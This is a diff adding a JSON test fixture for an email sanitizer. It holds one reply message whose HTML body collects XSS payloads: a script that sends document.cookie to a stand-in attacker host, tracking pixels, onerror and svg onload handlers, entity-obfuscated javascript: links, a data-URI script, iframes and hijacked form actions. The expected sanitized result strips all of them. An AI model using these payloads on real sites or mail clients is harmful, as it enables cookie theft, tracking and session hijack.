@@ -1,0 +1,28 @@
+{
+  "_meta": {
+    "title": "Hostile HTML — script, inline handlers, CSS payload, remote-image tracker, svg/iframe, scheme-obfuscated hrefs",
+    "covers": "§7.6 corpus: HTML with <script>, <style>/CSS payloads, inline event handlers, and remote-image trackers",
+    "expect": "204; threaded; and the STORED body_html_sanitized (read straight out of Postgres, not re-sanitized at render) contains NO script/style/svg/iframe/img tag, NO on* attribute, NO javascript:/data: URL, NO style attribute, and NO remote image URL — while the human-readable sentence survives"
+  },
+  "items": [
+    {
+      "Uuid": ["c1d0a1b2-0000-4000-8000-00000000a010"],
+      "MessageId": "<hostile-html-10-{{RUN}}@attacker.invalid>",
+      "From": { "Name": "Dita Prameswari", "Address": "dita@client-one.invalid" },
+      "To": [{ "Name": "", "Address": "reply+{{TOKEN}}@{{REPLY_DOMAIN}}" }],
+      "Cc": [],
+      "Recipients": ["reply+{{TOKEN}}@{{REPLY_DOMAIN}}"],
+      "SentAtDate": "Tue, 04 Aug 2026 11:00:00 +0800",
+      "Subject": "Re: Approval needed: Website scope sign-off",
+      "RawTextBody": "Approved, see the attached notes.",
+      "RawHtmlBody": "<html><head><style>body{background:url('https://tracker.attacker.invalid/px.gif')} p::after{content:'injected'}</style></head><body><p>Approved, see the attached notes.</p><script>fetch('https://attacker.invalid/steal?c='+document.cookie)</script><script src=\"https://attacker.invalid/x.js\"></script><img src=\"https://tracker.attacker.invalid/open.gif?id=42\" width=\"1\" height=\"1\"><img src=x onerror=\"fetch('https://attacker.invalid/x')\"><div onmouseover=\"alert(1)\" style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999\">clickjack overlay</div><a href=\"javascript:alert(document.domain)\">click me</a><a href=\"java&Tab;script:alert(1)\">entity trick</a><a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">numeric entity trick</a><a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">data uri</a><a href=\"https://client-one.invalid/ok\">legitimate link</a><iframe src=\"https://attacker.invalid/frame\"></iframe><svg onload=\"alert(1)\"><desc>svg body</desc></svg><math><mtext><script>alert(2)</script></mtext></math><form action=\"https://attacker.invalid/post\"><button formaction=\"https://attacker.invalid/p\">Approve</button><input name=\"x\" value=\"y\"></form><object data=\"https://attacker.invalid/o\"></object><embed src=\"https://attacker.invalid/e\"><!--[if IE]><script>alert(3)</script><![endif]--><table><tr><td>cell text survives</td></tr></table><a title=\"a>b\" href=\"https://client-one.invalid/quoted\">quoted-gt attribute</a><p>tail text</p></body></html>",
+      "ExtractedMarkdownMessage": "Approved, see the attached notes.",
+      "Attachments": [],
+      "Headers": {
+        "Content-Type": "text/html; charset=utf-8",
+        "Message-Id": "<hostile-html-10-{{RUN}}@attacker.invalid>"
+      },
+      "SpamScore": 8.1
+    }
+  ]
+}
